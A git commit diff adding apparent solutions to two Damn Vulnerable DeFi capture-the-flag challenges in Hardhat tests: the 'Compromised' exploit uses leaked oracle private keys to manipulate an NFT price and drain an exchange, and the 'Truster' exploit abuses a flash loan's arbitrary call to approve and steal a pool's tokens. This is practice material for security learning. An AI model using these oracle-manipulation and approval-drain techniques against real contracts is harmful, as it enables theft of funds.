e8da0b991fdd77f0fcd6991ffcb0247fe3a7db3b
0xTutturu <tutturutech@gmail.com>
2022-09-27 15:34:02 +0200

    solutions to dvdefi

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -1,89 +1,148 @@
-const { expect } = require('chai');
-const { ethers } = require('hardhat');
+const { expect } = require("chai");
+const { ethers } = require("hardhat");
 
-describe('Compromised challenge', function () {
+describe("Compromised challenge", function () {
+	const sources = [
+		"0xA73209FB1a42495120166736362A1DfA9F95A105",
+		"0xe92401A4d3af5E446d93D11EEc806b1462b39D15",
+		"0x81A5D6E50C214044bE44cA0CB057fe119097850c",
+	];
 
-    const sources = [
-        '0xA73209FB1a42495120166736362A1DfA9F95A105',
-        '0xe92401A4d3af5E446d93D11EEc806b1462b39D15',
-        '0x81A5D6E50C214044bE44cA0CB057fe119097850c'
-    ];
+	let deployer, attacker;
+	const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther("9990");
+	const INITIAL_NFT_PRICE = ethers.utils.parseEther("999");
 
-    let deployer, attacker;
-    const EXCHANGE_INITIAL_ETH_BALANCE = ethers.utils.parseEther('9990');
-    const INITIAL_NFT_PRICE = ethers.utils.parseEther('999');
+	before(async function () {
+		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+		[deployer, attacker] = await ethers.getSigners();
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+		const ExchangeFactory = await ethers.getContractFactory(
+			"Exchange",
+			deployer
+		);
+		const DamnValuableNFTFactory = await ethers.getContractFactory(
+			"DamnValuableNFT",
+			deployer
+		);
+		const TrustfulOracleFactory = await ethers.getContractFactory(
+			"TrustfulOracle",
+			deployer
+		);
+		const TrustfulOracleInitializerFactory = await ethers.getContractFactory(
+			"TrustfulOracleInitializer",
+			deployer
+		);
 
-        const ExchangeFactory = await ethers.getContractFactory('Exchange', deployer);
-        const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
-        const TrustfulOracleFactory = await ethers.getContractFactory('TrustfulOracle', deployer);
-        const TrustfulOracleInitializerFactory = await ethers.getContractFactory('TrustfulOracleInitializer', deployer);
+		// Initialize balance of the trusted source addresses
+		for (let i = 0; i < sources.length; i++) {
+			await ethers.provider.send("hardhat_setBalance", [
+				sources[i],
+				"0x1bc16d674ec80000", // 2 ETH
+			]);
+			expect(await ethers.provider.getBalance(sources[i])).to.equal(
+				ethers.utils.parseEther("2")
+			);
+		}
 
-        // Initialize balance of the trusted source addresses
-        for (let i = 0; i < sources.length; i++) {
-            await ethers.provider.send("hardhat_setBalance", [
-                sources[i],
-                "0x1bc16d674ec80000", // 2 ETH
-            ]);
-            expect(
-                await ethers.provider.getBalance(sources[i])
-            ).to.equal(ethers.utils.parseEther('2'));
-        }
+		// Attacker starts with 0.1 ETH in balance
+		await ethers.provider.send("hardhat_setBalance", [
+			attacker.address,
+			"0x16345785d8a0000", // 0.1 ETH
+		]);
+		expect(await ethers.provider.getBalance(attacker.address)).to.equal(
+			ethers.utils.parseEther("0.1")
+		);
 
-        // Attacker starts with 0.1 ETH in balance
-        await ethers.provider.send("hardhat_setBalance", [
-            attacker.address,
-            "0x16345785d8a0000", // 0.1 ETH
-        ]);
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.equal(ethers.utils.parseEther('0.1'));
+		// Deploy the oracle and setup the trusted sources with initial prices
+		this.oracle = await TrustfulOracleFactory.attach(
+			await (
+				await TrustfulOracleInitializerFactory.deploy(
+					sources,
+					["DVNFT", "DVNFT", "DVNFT"],
+					[INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
+				)
+			).oracle()
+		);
 
-        // Deploy the oracle and setup the trusted sources with initial prices
-        this.oracle = await TrustfulOracleFactory.attach(
-            await (await TrustfulOracleInitializerFactory.deploy(
-                sources,
-                ["DVNFT", "DVNFT", "DVNFT"],
-                [INITIAL_NFT_PRICE, INITIAL_NFT_PRICE, INITIAL_NFT_PRICE]
-            )).oracle()
-        );
+		// Deploy the exchange and get the associated ERC721 token
+		this.exchange = await ExchangeFactory.deploy(this.oracle.address, {
+			value: EXCHANGE_INITIAL_ETH_BALANCE,
+		});
+		this.nftToken = await DamnValuableNFTFactory.attach(
+			await this.exchange.token()
+		);
+	});
 
-        // Deploy the exchange and get the associated ERC721 token
-        this.exchange = await ExchangeFactory.deploy(
-            this.oracle.address,
-            { value: EXCHANGE_INITIAL_ETH_BALANCE }
-        );
-        this.nftToken = await DamnValuableNFTFactory.attach(await this.exchange.token());
-    });
+	it("Exploit", async function () {
+		/** CODE YOUR EXPLOIT HERE */
+		const oracleOne = new ethers.Wallet(
+			"0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
+			ethers.provider
+		);
+		const oracleTwo = new ethers.Wallet(
+			"0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
+			ethers.provider
+		);
 
-    it('Exploit', async function () {        
-        /** CODE YOUR EXPLOIT HERE */
-    });
+		const symbol = await this.nftToken.connect(attacker).symbol();
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
-        
-        // Exchange must have lost all ETH
-        expect(
-            await ethers.provider.getBalance(this.exchange.address)
-        ).to.be.eq('0');
-        
-        // Attacker's ETH balance must have significantly increased
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.be.gt(EXCHANGE_INITIAL_ETH_BALANCE);
-        
-        // Attacker must not own any NFT
-        expect(
-            await this.nftToken.balanceOf(attacker.address)
-        ).to.be.eq('0');
+		await expect(this.oracle.connect(oracleOne).postPrice(symbol, 0)).to.not.be
+			.reverted;
 
-        // NFT price shouldn't have changed
-        expect(
-            await this.oracle.getMedianPrice("DVNFT")
-        ).to.eq(INITIAL_NFT_PRICE);
-    });
+		await expect(this.oracle.connect(oracleTwo).postPrice(symbol, 0)).to.not.be
+			.reverted;
+
+		await expect(this.exchange.connect(attacker).buyOne({ value: 1 })).to.not.be
+			.reverted;
+
+		expect(
+			await this.nftToken.connect(attacker).balanceOf(attacker.address)
+		).to.equal(1);
+
+		const currBalance = await ethers.provider.getBalance(this.exchange.address);
+
+		await expect(this.oracle.connect(oracleOne).postPrice(symbol, currBalance))
+			.to.not.be.reverted;
+
+		await expect(this.oracle.connect(oracleTwo).postPrice(symbol, currBalance))
+			.to.not.be.reverted;
+
+		expect(await this.oracle.connect(attacker).getMedianPrice(symbol)).to.equal(
+			currBalance
+		);
+
+		await expect(
+			this.nftToken.connect(attacker).approve(this.exchange.address, 0)
+		).to.not.be.reverted;
+
+		await expect(this.exchange.connect(attacker).sellOne(0)).to.not.be.reverted;
+
+		await expect(
+			this.oracle.connect(oracleOne).postPrice(symbol, INITIAL_NFT_PRICE)
+		).to.not.be.reverted;
+
+		await expect(
+			this.oracle.connect(oracleTwo).postPrice(symbol, INITIAL_NFT_PRICE)
+		).to.not.be.reverted;
+	});
+
+	after(async function () {
+		/** SUCCESS CONDITIONS */
+
+		// Exchange must have lost all ETH
+		expect(await ethers.provider.getBalance(this.exchange.address)).to.be.eq(
+			"0"
+		);
+
+		// Attacker's ETH balance must have significantly increased
+		expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(
+			EXCHANGE_INITIAL_ETH_BALANCE
+		);
+
+		// Attacker must not own any NFT
+		expect(await this.nftToken.balanceOf(attacker.address)).to.be.eq("0");
+
+		// NFT price shouldn't have changed
+		expect(await this.oracle.getMedianPrice("DVNFT")).to.eq(INITIAL_NFT_PRICE);
+	});
 });
--- test/truster/truster.challenge.js
+++ test/truster/truster.challenge.js
@@ -1,46 +1,72 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require("hardhat");
+const { expect } = require("chai");
 
-describe('[Challenge] Truster', function () {
-    let deployer, attacker;
+describe("[Challenge] Truster", function () {
+	let deployer, attacker;
 
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
+	const TOKENS_IN_POOL = ethers.utils.parseEther("1000000");
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, attacker] = await ethers.getSigners();
+	before(async function () {
+		/** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+		[deployer, attacker] = await ethers.getSigners();
 
-        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);
+		const DamnValuableToken = await ethers.getContractFactory(
+			"DamnValuableToken",
+			deployer
+		);
+		const TrusterLenderPool = await ethers.getContractFactory(
+			"TrusterLenderPool",
+			deployer
+		);
 
-        this.token = await DamnValuableToken.deploy();
-        this.pool = await TrusterLenderPool.deploy(this.token.address);
+		this.token = await DamnValuableToken.deploy();
+		this.pool = await TrusterLenderPool.deploy(this.token.address);
 
-        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
+		await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+		expect(await this.token.balanceOf(this.pool.address)).to.equal(
+			TOKENS_IN_POOL
+		);
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal('0');
-    });
+		expect(await this.token.balanceOf(attacker.address)).to.equal("0");
+	});
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE  */
-    });
+	it("Exploit", async function () {
+		/** CODE YOUR EXPLOIT HERE  */
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+		let amount = this.token.balanceOf(this.pool.address);
 
-        // Attacker has taken all tokens from the pool
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(TOKENS_IN_POOL);
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal('0');
-    });
+		let ABI = ["function approve(address spender, uint256 amount)"];
+		let iface = new ethers.utils.Interface(ABI);
+		let data = iface.encodeFunctionData("approve", [
+			attacker.address,
+			ethers.utils.parseEther("1000000"),
+		]);
+
+		await expect(
+			this.pool
+				.connect(attacker)
+				.flashLoan(0, attacker.address, this.token.address, data)
+		).to.not.be.reverted;
+
+		await expect(
+			this.token
+				.connect(attacker)
+				.transferFrom(
+					this.pool.address,
+					attacker.address,
+					ethers.utils.parseEther("1000000")
+				)
+		).to.not.be.reverted;
+	});
+
+	after(async function () {
+		/** SUCCESS CONDITIONS */
+
+		// Attacker has taken all tokens from the pool
+		expect(await this.token.balanceOf(attacker.address)).to.equal(
+			TOKENS_IN_POOL
+		);
+		expect(await this.token.balanceOf(this.pool.address)).to.equal("0");
+	});
 });
-
